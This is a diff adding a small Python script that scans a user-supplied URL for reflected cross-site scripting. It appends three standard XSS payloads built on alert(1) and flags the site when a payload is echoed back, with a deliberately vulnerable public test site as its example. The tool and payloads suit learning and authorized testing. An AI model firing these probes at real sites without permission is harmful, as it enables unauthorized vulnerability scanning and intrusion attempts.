@@ -1,0 +1,19 @@
+import requests
+
+url = input("Enter URL (example: http://testphp.vulnweb.com/search.php?test=): ")
+
+payloads = [
+    "<script>alert(1)</script>",
+    "\"><script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>"
+]
+
+print("\nScanning for XSS...\n")
+
+for payload in payloads:
+    target = url + payload
+    
+    response = requests.get(target)
+    
+    if payload in response.text:
+        print(f"[+] XSS Vulnerability Found with payload: {payload}")
